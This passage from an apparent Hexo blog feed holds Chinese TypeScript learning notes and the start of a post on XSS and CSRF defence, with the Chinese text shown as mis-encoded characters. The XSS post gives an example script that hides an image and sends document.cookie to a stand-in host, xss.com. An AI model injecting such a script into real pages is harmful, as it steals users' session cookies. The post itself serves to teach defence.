class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Image æ²¡æœ‰ç»§æ‰¿è‡ª Controlï¼Œæ²¡æœ‰ state å±æ€§ï¼Œæ— æ³•å®ç° SelectableControl æ¥å£</span></span><br><span class="line"><span class="comment">// é”™è¯¯ï¼šâ€œImageâ€ç±»å‹ç¼ºå°‘â€œstateâ€å±æ€§ã€‚</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Image</span> <span class="title">implements</span> <span class="title">SelectableControl</span> </span>&#123;</span><br><span class="line">    select() &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ¬ç¯‡ä»‹ç» &lt;code&gt;typescript&lt;/code&gt; ä¸­æ¥å£çš„ä½¿ç”¨æ–¹å¼ã€‚&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Typescriptå­¦ä¹ æ—¥è®°(ä¸€)</title>
    <link href="https://github.com/TheNightElf/2018/01/08/Typescript%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://github.com/TheNightElf/2018/01/08/Typescriptå­¦ä¹ æ—¥è®°ï¼ˆä¸€ï¼‰/</id>
    <published>2018-01-08T08:14:30.000Z</published>
    <updated>2018-01-09T03:05:37.868Z</updated>
    
    <content type="html"><![CDATA[<p><code>javascript</code> æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ä¸€é—¨è„šæœ¬è¯­è¨€ï¼Œä¸ºäº†å°½å¯èƒ½çš„å‡å°‘å†…å­˜çš„å¼€æ”¯æ‰€ä»¥åœ¨è®¾è®¡ä¹‹åˆå®ƒå°±æ˜¯ä¸€é—¨ <code>å¼±ç±»å‹</code> çš„è¯­è¨€ã€‚è¿™åœ¨å¼€å‘å°è€Œç®€å•çš„åº”ç”¨æ—¶æ˜¯å¯ä»¥ä¸ºæˆ‘ä»¬å¸¦æ¥æ€§èƒ½çš„æå‡ï¼Œä½†æ˜¯éšç€é¡¹ç›®çš„æ‰©å¤§ <code>çŠ¶æ€</code> å˜çš„éš¾ä»¥è¿½è¸ªå°†ä¼šå¼•å‘å¾ˆå¤šçš„ <code>bug</code> å‡ºç°ã€‚<br>ä¾‹å­ï¼š<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'undefined'</span></span><br><span class="line"></span><br><span class="line">test = <span class="string">'str'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'string'</span></span><br><span class="line"></span><br><span class="line">test = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> test;</span><br><span class="line"><span class="comment">// -&gt; 'number'</span></span><br></pre></td></tr></table></figure></p><a id="more"></a><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ¬ç¼–æ–‡ç¨¿å¹¶æ²¡æœ‰ä»»ä½• <code>æ•™ç¨‹</code> çš„è§‚ç‚¹ï¼Œåªæ˜¯ä¸ºå­¦ä¹  <code>typescript</code> å†™ä¸‹çš„ä¸€ä¸ªæ—¥å¿—å’Œæ€»ç»“ã€‚ğŸ¤</p><h3 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript"></a>Typescript</h3><p><code>typescript</code> æ˜¯ <code>javascript</code> çš„å¼ºç±»å‹ç‰ˆæœ¬ã€‚å®ƒä¼šåœ¨ç¼–è¯‘æœŸå»æ‰ç±»å‹å’Œç‰¹æœ‰è¯­æ³•ç”Ÿæˆ <code>javascript</code> ä»£ç ã€‚<code>typescript</code> æ˜¯ <code>javascript</code> çš„è¶…é›†ï¼Œå®ƒæ”¯æŒæ‰€æœ‰ <code>javascriptè¯­æ³•</code>ï¼Œä¸æ­¤åŒæ—¶å®ƒåˆä¸º <code>javascript</code> æ·»åŠ äº† <code>é™æ€ç±»å‹æ£€æŸ¥</code> ä½¿å¾— <code>javacript</code> ä¹Ÿæ‹¥æœ‰äº† <code>å¼ºç±»å‹è¯­è¨€</code> çš„ç‰¹æ€§ã€‚</p><h3 id="Typescript-åŸºç¡€ç±»å‹"><a href="#Typescript-åŸºç¡€ç±»å‹" class="headerlink" title="Typescript åŸºç¡€ç±»å‹"></a>Typescript åŸºç¡€ç±»å‹</h3><h4 id="å¸ƒå°”å€¼-boolean"><a href="#å¸ƒå°”å€¼-boolean" class="headerlink" title="å¸ƒå°”å€¼(boolean)"></a>å¸ƒå°”å€¼(boolean)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bool: boolean = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">bool = <span class="number">123</span>;</span><br><span class="line"><span class="comment">// æŠ¥é”™ï¼Œ123æ˜¯numberç±»å‹è€Œébooleanç±»å‹</span></span><br><span class="line"></span><br><span class="line">bool = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// okï¼Œtrueæ˜¯ä¸€ä¸ªbooleanç±»å‹</span></span><br></pre></td></tr></table></figure><h4 id="æ•°å€¼-number"><a href="#æ•°å€¼-number" class="headerlink" title="æ•°å€¼(number)"></a>æ•°å€¼(number)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num: number = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">num = <span class="string">'str'</span>;</span><br><span class="line"><span class="comment">// error</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">456</span>;</span><br><span class="line"><span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²-string"><a href="#å­—ç¬¦ä¸²-string" class="headerlink" title="å­—ç¬¦ä¸²(string)"></a>å­—ç¬¦ä¸²(string)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: string = <span class="string">'str'</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><h4 id="æ•°ç»„-array"><a href="#æ•°ç»„-array" class="headerlink" title="æ•°ç»„(array)"></a>æ•°ç»„(array)</h4><p><strong>å®šä¹‰æ–¹å¼ï¼š</strong><br>ç¬¬ä¸€ç§ï¼Œå¯ä»¥åœ¨ <code>å…ƒç´ ç±»å‹</code> åé¢æ¥ä¸Š <code>[]</code>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: number[] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></figure></p><p>ç¬¬äºŒç§ï¼Œä½¿ç”¨ <code>æ•°ç»„æ³›å‹</code> å®šä¹‰ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr: <span class="built_in">Array</span>&lt;number&gt; = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>];</span><br></pre></td></tr></table></figure></p><h4 id="å…ƒç»„-tuple"><a href="#å…ƒç»„-tuple" class="headerlink" title="å…ƒç»„(tuple)"></a>å…ƒç»„(tuple)</h4><p>å…ƒç»„ç±»å‹å…è®¸è¡¨ç¤ºä¸€ä¸ªå·²çŸ¥å…ƒç´ æ•°é‡å’Œç±»å‹çš„æ•°ç»„(å…¶å®å°±æ˜¯ä¸€ä¸ªæ•°ç»„å†…åŒ…å«å¤šä¸ªç±»å‹çš„å€¼)ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tup: [number, string] = [<span class="number">123</span>,<span class="string">'str'</span>];</span><br></pre></td></tr></table></figure></p><h4 id="æšä¸¾-enum"><a href="#æšä¸¾-enum" class="headerlink" title="æšä¸¾(enum)"></a>æšä¸¾(enum)</h4><p><code>enum</code> ç±»å‹æ˜¯å¯¹JavaScriptæ ‡å‡†æ•°æ®ç±»å‹çš„ä¸€ä¸ªè¡¥å……ã€‚ åƒC#ç­‰å…¶å®ƒè¯­è¨€ä¸€æ ·ï¼Œä½¿ç”¨æšä¸¾ç±»å‹å¯ä»¥ä¸ºä¸€ç»„æ•°å€¼èµ‹äºˆå‹å¥½çš„åå­—ã€‚<br><strong>ç”¨äººè¯è¯´å°±æ˜¯ï¼šæŠŠä¸€ç»„å€¼æ”¾åˆ°ä¸€ä¸ªå¯è¿­ä»£çš„å¯¹è±¡ä¸­ï¼Œç„¶åç»™è¿™ä¸ªå¯¹è±¡èµ·äº†ä¸ªåå­—ã€‚</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">enum animal &#123;dog,cat,pig&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯¹è±¡å–å€¼</span></span><br><span class="line"><span class="keyword">let</span> a: animal = animal.dog</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•°ç»„å–å€¼</span></span><br><span class="line"><span class="keyword">let</span> b = animal[<span class="number">0</span>] <span class="comment">// -&gt; dog</span></span><br><span class="line"><span class="keyword">let</span> b = animal[<span class="number">1</span>] <span class="comment">// -&gt; cat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯ä»¥æ‰‹åŠ¨æ›´æ”¹ç´¢å¼•</span></span><br><span class="line"><span class="comment">// enum animal &#123;dog = 1, cat, pig&#125;</span></span><br><span class="line"><span class="comment">// let b = animal[1] // -&gt; dog</span></span><br><span class="line"><span class="comment">// let b = animal[2] // -&gt; cat</span></span><br></pre></td></tr></table></figure><h4 id="ä»»ä½•ç±»å‹-any"><a href="#ä»»ä½•ç±»å‹-any" class="headerlink" title="ä»»ä½•ç±»å‹(any)"></a>ä»»ä½•ç±»å‹(any)</h4><p>è‹¥æ˜¯ä¸æ¸…æ¥šå˜é‡çš„å…·ä½“ç±»å‹å¯ä»¥æŒ‡å®šä¸º <code>any</code>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a: any = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">a = <span class="string">'str'</span>; <span class="comment">// success</span></span><br><span class="line">a = <span class="number">123</span>; <span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="æ— ç±»å‹-void"><a href="#æ— ç±»å‹-void" class="headerlink" title="æ— ç±»å‹(void)"></a>æ— ç±»å‹(void)</h4><p>ä¸ <code>any</code> ç›¸åã€‚ä¸€ä¸ªå‡½æ•°æ²¡æœ‰è¿”å›å€¼çš„æ—¶å€™é€šå¸¸æŒ‡å®šå…¶è¿”å›å€¼ç±»å‹ä¸º <code>void</code>ã€‚<br>ä¸€ä¸ª <code>void</code> ç±»å‹çš„å˜é‡åªèƒ½èµ‹å€¼ä¸º <code>undefined</code> | <code>null</code>ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noReturn</span>(<span class="params"></span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'è¿™ä¸ªå‡½æ•°æ²¡æœ‰è¿”å›å€¼'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> n: <span class="keyword">void</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// let n: void = undefined;</span></span><br></pre></td></tr></table></figure></p><h4 id="nullå’Œundefined"><a href="#nullå’Œundefined" class="headerlink" title="nullå’Œundefined"></a>nullå’Œundefined</h4><p><code>undefined</code>å’Œ<code>null</code>ä¸¤è€…å„è‡ªæœ‰è‡ªå·±çš„ç±»å‹è¿˜æ˜¯å«åš<code>undefined</code>å’Œ<code>null</code>ã€‚</p><p><strong>é»˜è®¤æƒ…å†µä¸‹nullå’Œundefinedæ˜¯æ‰€æœ‰ç±»å‹çš„å­ç±»å‹ã€‚ å°±æ˜¯è¯´ä½ å¯ä»¥æŠŠ nullå’Œundefinedèµ‹å€¼ç»™numberç±»å‹çš„å˜é‡ã€‚</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> u: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> n: <span class="literal">null</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num: number = <span class="number">123</span>;</span><br><span class="line">num = <span class="literal">undefined</span>; <span class="comment">// success</span></span><br></pre></td></tr></table></figure><h4 id="æ°¸è¿œä¸å­˜åœ¨çš„å€¼-never"><a href="#æ°¸è¿œä¸å­˜åœ¨çš„å€¼-never" class="headerlink" title="æ°¸è¿œä¸å­˜åœ¨çš„å€¼(never)"></a>æ°¸è¿œä¸å­˜åœ¨çš„å€¼(never)</h4><p>ä¾‹å¦‚ï¼Œ neverç±»å‹æ˜¯é‚£äº›æ€»æ˜¯ä¼šæŠ›å‡ºå¼‚å¸¸æˆ–æ ¹æœ¬å°±ä¸ä¼šæœ‰è¿”å›å€¼çš„å‡½æ•°è¡¨è¾¾å¼æˆ–ç®­å¤´å‡½æ•°è¡¨è¾¾å¼çš„è¿”å›å€¼ç±»å‹ï¼›<br><strong>neverç±»å‹æ˜¯ä»»ä½•ç±»å‹çš„å­ç±»å‹ï¼Œä¹Ÿå¯ä»¥èµ‹å€¼ç»™ä»»ä½•ç±»å‹ï¼›ç„¶è€Œï¼Œæ²¡æœ‰ç±»å‹æ˜¯neverçš„å­ç±»å‹æˆ–å¯ä»¥èµ‹å€¼ç»™neverç±»å‹ï¼ˆé™¤äº†neveræœ¬èº«ä¹‹å¤–ï¼‰ã€‚ å³ä½¿ anyä¹Ÿä¸å¯ä»¥èµ‹å€¼ç»™neverã€‚</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> n: never; <span class="comment">// never ä¸èƒ½è¢«èµ‹å€¼</span></span><br><span class="line"><span class="keyword">let</span> num: number = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">let</span> a: any;</span><br><span class="line"></span><br><span class="line">num = n; <span class="comment">// successï¼Œneverç±»å‹æ˜¯ä»»ä½•ç±»å‹çš„å­ç±»å‹</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">123</span>; <span class="comment">// error</span></span><br><span class="line">n = a; <span class="comment">// error</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿”å›neverçš„å‡½æ•°å¿…é¡»å­˜åœ¨æ— æ³•è¾¾åˆ°çš„ç»ˆç‚¹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">message: string</span>): <span class="title">never</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç±»å‹æ–­è¨€"><a href="#ç±»å‹æ–­è¨€" class="headerlink" title="ç±»å‹æ–­è¨€"></a>ç±»å‹æ–­è¨€</h4><p>æœ‰æ—¶å€™ä½ ä¼šé‡åˆ°è¿™æ ·çš„æƒ…å†µï¼Œä½ ä¼šæ¯”TypeScriptæ›´äº†è§£æŸä¸ªå€¼çš„è¯¦ç»†ä¿¡æ¯ã€‚ é€šå¸¸è¿™ä¼šå‘ç”Ÿåœ¨ä½ æ¸…æ¥šåœ°çŸ¥é“ä¸€ä¸ªå®ä½“å…·æœ‰æ¯”å®ƒç°æœ‰ç±»å‹æ›´ç¡®åˆ‡çš„ç±»å‹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> str: any = <span class="string">"this is a string"</span>;</span><br><span class="line"><span class="keyword">let</span> strLength1: number;</span><br><span class="line"><span class="keyword">let</span> strLength2: number;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ as æ–­è¨€è¯­æ³•</span></span><br><span class="line">strLength1 = (str <span class="keyword">as</span> string).length;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ &lt;&gt; æ–­è¨€è¯­æ³•</span></span><br><span class="line">strLength2 = (&lt;string&gt;str).length;</span><br><span class="line"></span><br><span class="line">// ä¸Šé¢è¿™ä¸¤ç§æ–­è¨€æ–¹å¼å¾—åˆ°çš„æ•ˆæœå®Œå…¨ä¸€è‡´ï¼Œä¸‹é¢å¢åŠ çš„å†…å®¹æ˜¯å› ä¸ºæ¨¡ç‰ˆå‡ºäº†ç‚¹bug</span><br><span class="line">// å¯¹äºè¯­æ³•çš„è§£æå·²ç»ä¸æ˜¯jsçš„è¯­æ³•äº†ï¼Œä¸å¡«å……ä»¥ä¸‹å†…å®¹ï¼Œæ•´å—jséƒ½æ— æ³•å±•ç¤º</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br><span class="line">strLength1 === strLength2; // -&gt; true</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæ˜¯ <code>typescript</code> æ‰€æœ‰çš„åŸºç¡€ç±»å‹ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;javascript&lt;/code&gt; æ˜¯è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ä¸€é—¨è„šæœ¬è¯­è¨€ï¼Œä¸ºäº†å°½å¯èƒ½çš„å‡å°‘å†…å­˜çš„å¼€æ”¯æ‰€ä»¥åœ¨è®¾è®¡ä¹‹åˆå®ƒå°±æ˜¯ä¸€é—¨ &lt;code&gt;å¼±ç±»å‹&lt;/code&gt; çš„è¯­è¨€ã€‚è¿™åœ¨å¼€å‘å°è€Œç®€å•çš„åº”ç”¨æ—¶æ˜¯å¯ä»¥ä¸ºæˆ‘ä»¬å¸¦æ¥æ€§èƒ½çš„æå‡ï¼Œä½†æ˜¯éšç€é¡¹ç›®çš„æ‰©å¤§ &lt;code&gt;çŠ¶æ€&lt;/code&gt; å˜çš„éš¾ä»¥è¿½è¸ªå°†ä¼šå¼•å‘å¾ˆå¤šçš„ &lt;code&gt;bug&lt;/code&gt; å‡ºç°ã€‚&lt;br&gt;ä¾‹å­ï¼š&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;undefined&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test = &lt;span class=&quot;string&quot;&gt;&#39;str&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;string&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;test = &lt;span class=&quot;number&quot;&gt;123&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; test;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// -&amp;gt; &#39;number&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSSå’ŒCSRFé˜²å¾¡</title>
    <link href="https://github.com/TheNightElf/2018/01/05/XSS%E5%92%8CCSRF%E9%98%B2%E5%BE%A1/"/>
    <id>https://github.com/TheNightElf/2018/01/05/XSSå’ŒCSRFé˜²å¾¡/</id>
    <published>2018-01-05T06:02:51.000Z</published>
    <updated>2018-01-05T06:43:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>XSSå’ŒCSRF(XSRF)éƒ½å±äºè·¨ç«™æ”»å‡»ï¼ŒXSSæ˜¯å®ç°CSRF(XSRF)è¯¸å¤šé€”å¾„ä¸­çš„ä¸€æ¡ï¼Œä½†ä¸æ˜¯å”¯ä¸€ä¸€æ¡ã€‚</p><a id="more"></a><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>XSSçš„æœ¬è´¨æ˜¯è®©å¯¹æ–¹æµè§ˆå™¨æ‰§è¡Œä½ æ’å…¥çš„js ï¼Œæ¥è·å–<code>cookie</code>ç­‰ä¿¡æ¯ï¼›<br>CSRF(XSRF)æ˜¯å€Ÿç”¨ç”¨æˆ·çš„èº«ä»½ï¼Œå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚</p><h3 id="XSSçš„ç±»å‹"><a href="#XSSçš„ç±»å‹" class="headerlink" title="XSSçš„ç±»å‹"></a>XSSçš„ç±»å‹</h3><h5 id="å‚¨å­˜å‹"><a href="#å‚¨å­˜å‹" class="headerlink" title="å‚¨å­˜å‹"></a>å‚¨å­˜å‹</h5><p>å‚¨å­˜å‹çš„XSSä»£ç æ˜¯å‚¨å­˜åœ¨æœåŠ¡å™¨ç«¯ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼ŒåŠ å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™è§¦å‘ä»£ç æ‰§è¡Œã€‚è¿™ç§XSSæ¯”è¾ƒå±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œç›—çªƒ <code>cookie</code> ç­‰ã€‚</p><h5 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a>åå°„å‹</h5><p>åå°„å‹XSSéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ã€‚å‘å‡ºè¯·æ±‚æ—¶ï¼ŒXSSä»£ç å‡ºç°åœ¨URLä¸­ï¼Œä½œä¸ºè¾“å…¥æäº¤åˆ°æœåŠ¡å™¨ç«¯ï¼ŒæœåŠ¡å™¨ç«¯è§£æåå“åº”ï¼ŒXSSä»£ç éšå“åº”å†…å®¹ä¸€èµ·ä¼ å›ç»™æµè§ˆå™¨ï¼Œæœ€åæµè§ˆå™¨è§£ææ‰§è¡ŒXSSã€‚</p><p><strong>Example:</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">'http://www.xss.com?cookie='</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line">img.style.display = <span class="string">'none'</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(img);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿™æ ·å°±èƒ½åœ¨ç”¨æˆ·ä¸çŸ¥é“çš„æƒ…å†µä¸‹å°†ç”¨æˆ·åœ¨è¯¥ç½‘ç«™çš„ `cookie` ä¿¡æ¯ä»¥ `get` è¯·æ±‚çš„æ–¹å¼å‘é€ç»™å¦ä¸€ä¸ªåœ°å€ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="XSSçš„é˜²èŒƒ"><a href="#XSSçš„é˜²èŒƒ" class="headerlink" title="XSSçš„é˜²èŒƒ"></a>XSSçš„é˜²èŒƒ</h3><p>å®¢æˆ·ç«¯æ ¡éªŒç”¨æˆ·è¾“å…¥ä¿¡æ¯ï¼Œåªå…è®¸è¾“å…¥åˆæ³•çš„å€¼ï¼Œå…¶ä»–ä¸€æ¦‚è¿‡æ»¤æ‰ï¼Œé˜²æ­¢å®¢æˆ·ç«¯è¾“å…¥æ¶æ„çš„jsä»£ç è¢«æ¤å…¥åˆ°HTMLä»£ç ä¸­ï¼Œä½¿å¾—jsä»£ç å¾—ä»¥æ‰§è¡Œã€‚</p><p><strong>Example:</strong></p><ul><li>ç§»é™¤ç”¨æˆ·ä¸Šä¼ çš„DOMå±æ€§ï¼Œå¦‚ <code>onerror</code> ç­‰ã€‚</li><li>ç§»é™¤ç”¨æˆ·ä¸Šä¼ çš„ 